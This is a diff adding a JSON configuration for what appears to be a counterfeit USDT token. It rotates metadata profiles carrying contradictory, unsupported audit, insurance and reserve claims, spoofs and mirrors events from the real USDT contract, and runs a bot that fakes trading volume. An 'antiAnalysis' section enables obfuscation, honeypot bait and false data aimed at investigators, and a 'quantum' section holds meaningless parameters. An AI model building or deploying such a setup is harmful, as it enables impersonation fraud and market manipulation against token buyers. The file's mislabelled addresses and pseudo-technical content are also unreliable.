@@ -1,0 +1,125 @@
+{
+    "metadata": {
+        "profiles": {
+            "default": {
+                "name": "Tether USD",
+                "symbol": "USDT",
+                "decimals": 6,
+                "website": "https://tether.to",
+                "logo": "https://tether.to/images/logoCircle.png",
+                "whitepaper": "https://tether.to/whitepaper.pdf",
+                "audit": "Verified by CertiK",
+                "insurance": "100M USD Coverage",
+                "reserves": "https://wallet.tether.to/transparency"
+            },
+            "explorer": {
+                "name": "Tether USD",
+                "symbol": "USDT",
+                "decimals": 6,
+                "website": "https://tether.to",
+                "logo": "https://s2.coinmarketcap.com/static/img/coins/64x64/825.png",
+                "whitepaper": "https://tether.to/wp-content/uploads/2016/06/TetherWhitePaper.pdf",
+                "audit": "Multiple third-party audits completed",
+                "insurance": "Fully backed 1:1 with USD reserves",
+                "reserves": "https://tether.to/transparency"
+            },
+            "wallet": {
+                "name": "Tether USD",
+                "symbol": "USDT",
+                "decimals": 6,
+                "website": "https://tether.to",
+                "logo": "ipfs://QmXGPPjaDqzReZgkxgjyJfzxHotdTFgaYrCYdAqgv8w8Rb",
+                "whitepaper": "Available on request",
+                "audit": "Quarterly attestations published",
+                "insurance": "Protected by industry-leading security",
+                "reserves": "Verified by Moore Cayman"
+            }
+        },
+        "rotation": {
+            "enabled": true,
+            "intervalMinutes": 60,
+            "randomize": true
+        }
+    },
+    "events": {
+        "spoofing": {
+            "enabled": true,
+            "realUSDTAddress": "TR7NHqjeKQxGTCi8q8ZQojndr2EbSWRiff",
+            "ghostForkMultiplier": 3,
+            "randomDelay": {
+                "min": 0,
+                "max": 5000
+            }
+        },
+        "mirroring": {
+            "enabled": true,
+            "sources": [
+                "https://api.trongrid.io/v1/contracts/TR7NHqjeKQxGTCi8q8ZQojndr2EbSWRiff/events"
+            ],
+            "filterLargeTransfers": true,
+            "minAmount": 1000000000
+        }
+    },
+    "liquidity": {
+        "pairs": {
+            "USDT/TRX": {
+                "enabled": true,
+                "targetPrice": 1.0,
+                "priceDeviation": 0.001,
+                "rebalanceThreshold": 0.002,
+                "volumeTarget24h": 10000000
+            }
+        },
+        "bot": {
+            "intervalSeconds": 60,
+            "randomDelayMax": 15,
+            "organicSwapSize": {
+                "min": 0.001,
+                "max": 0.01
+            },
+            "mevSimulation": {
+                "enabled": true,
+                "probability": 0.05
+            }
+        }
+    },
+    "antiAnalysis": {
+        "enabled": true,
+        "suspicionThresholds": {
+            "lowRisk": 30,
+            "mediumRisk": 60,
+            "highRisk": 80,
+            "critical": 90
+        },
+        "countermeasures": {
+            "obfuscation": {
+                "enabled": true,
+                "maxLevel": 10
+            },
+            "honeypot": {
+                "enabled": true,
+                "baitAmount": 1000000000000
+            },
+            "falseData": {
+                "enabled": true,
+                "eventsPerTrigger": 5
+            }
+        },
+        "knownAnalysts": [
+            "0xdac17f958d2ee523a2206206994597c13d831ec7",
+            "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
+        ]
+    },
+    "quantum": {
+        "enabled": true,
+        "parameters": {
+            "maxSuperposition": 100,
+            "decoherenceThreshold": 1000,
+            "entanglementStrength": {
+                "min": 10,
+                "max": 90
+            },
+            "observerEffectMultiplier": 1.05
+        }
+    }
+}
